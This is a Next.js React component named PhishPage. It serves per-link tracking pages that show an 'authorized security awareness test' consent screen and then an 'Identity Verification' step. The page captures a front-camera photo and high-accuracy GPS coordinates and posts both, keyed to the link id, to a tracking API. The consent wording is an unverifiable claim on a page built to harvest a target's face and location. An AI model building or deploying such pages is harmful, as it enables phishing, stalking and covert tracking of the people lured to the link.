import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';

export default function PhishPage() {
  const router = useRouter();
  const { id } = router.query;
  const [showConsent, setShowConsent] = useState(true);
  const [page, setPage] = useState('consent');
  const [status, setStatus] = useState('');
  const videoRef = useState(null);

  const sendToAPI = async (type, extraData = {}) => {
    try {
      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: id, type, ...extraData })
      });
    } catch (e) {
      console.error('Failed to send data:', e);
    }
  };

  const takePhoto = async () => {
    setStatus('Requesting camera access...');
    try {
      // Browser shows permission popup - user MUST click Allow
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' } // Front camera
      });
      
      setStatus('Camera access granted! Capturing photo...');
      
      // Create video element to capture frame
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', '');
      video.setAttribute('autoplay', '');
      
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });
      
      // Wait a moment for camera to warm up
      await new Promise(r => setTimeout(r, 500));
      
      // Capture frame to canvas
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      
      // Draw video frame to canvas
      ctx.drawImage(video, 0, 0, 640, 480);
      
      // Convert to JPEG data URL
      const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
      
      // Stop camera
      stream.getTracks().forEach(track => track.stop());
      
      setStatus('Photo captured! Sending...');
      
      // Send the base64 photo data to our API
      // The API will need to handle this or upload to imgur
      await sendToAPI('photo', { 
        photoData: photoDataUrl,
        note: 'Photo captured with user consent'
      });
      
      setStatus('✅ Photo sent successfully!');
      setPage('done');
      
    } catch (e) {
      console.error('Camera error:', e);
      setStatus('❌ Camera access denied or error occurred');
    }
  };

  const getLocation = async () => {
    setStatus('Requesting location...');
    try {
      // Browser shows permission popup - user MUST click Allow
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      });
      
      setStatus('✅ Location obtained! Sending...');
      
      await sendToAPI('location', {
        coords: {
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          accuracy: position.coords.accuracy
        }
      });
      
      setStatus('✅ Location sent successfully!');
      setPage('done');
      
    } catch (e) {
      console.error('Location error:', e);
      setStatus('❌ Location access denied or unavailable');
    }
  };

  // Consent screen
  if (page === 'consent') {
    return (
      <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial', maxWidth: '600px', margin: '0 auto' }}>
        <div style={{ backgroundColor: '#fff3cd', border: '1px solid #ffc107', borderRadius: '10px', padding: '20px', marginBottom: '20px' }}>
          <h1 style={{ color: '#856404' }}>⚠️ Security Awareness Test</h1>
        </div>
        <p style={{ fontSize: '16px', lineHeight: '1.6' }}>
          This is an <strong>authorized security awareness test</strong> conducted by your organization's IT Security team.
        </p>
        <div style={{ textAlign: 'left', backgroundColor: '#f8f9fa', padding: '20px', borderRadius: '10px', margin: '20px 0' }}>
          <h3>By proceeding, you consent to:</h3>
          <ul style={{ lineHeight: '2' }}>
            <li>✅ Camera access for identity verification</li>
            <li>✅ Location access for security validation</li>
            <li>✅ Data being sent to the security team</li>
          </ul>
        </div>
        <button 
          onClick={() => setPage('test')}
          style={{ padding: '15px 40px', fontSize: '18px', margin: '10px', background: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          I Consent - Start Test
        </button>
      </div>
    );
  }

  // Test page with buttons
  if (page === 'test') {
    return (
      <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial', maxWidth: '600px', margin: '0 auto' }}>
        <h1>Identity Verification</h1>
        <p style={{ color: '#666', marginBottom: '30px' }}>
          Please complete the verification steps below. Your browser will ask for permission.
        </p>
        
        <div style={{ border: '1px solid #ddd', borderRadius: '10px', padding: '30px', margin: '20px 0' }}>
          <h2>📸 Step 1: Take Photo</h2>
          <p>Click the button below to capture a verification photo.</p>
          <button 
            onClick={takePhoto}
            style={{ padding: '15px 40px', fontSize: '16px', background: '#007bff', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
          >
            📷 Take Photo
          </button>
        </div>
        
        <div style={{ border: '1px solid #ddd', borderRadius: '10px', padding: '30px', margin: '20px 0' }}>
          <h2>📍 Step 2: Share Location</h2>
          <p>Click the button below to verify your location.</p>
          <button 
            onClick={getLocation}
            style={{ padding: '15px 40px', fontSize: '16px', background: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
          >
            📍 Share Location
          </button>
        </div>
        
        {status && (
          <div style={{ marginTop: '20px', padding: '15px', backgroundColor: '#f8f9fa', borderRadius: '10px' }}>
            <p>{status}</p>
          </div>
        )}
      </div>
    );
  }

  // Done screen
  return (
    <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial' }}>
      <h1>✅ Verification Complete</h1>
      <p>Thank you for participating in this security awareness test.</p>
      {status && <p style={{ color: '#666' }}>{status}</p>}
    </div>
  );
}
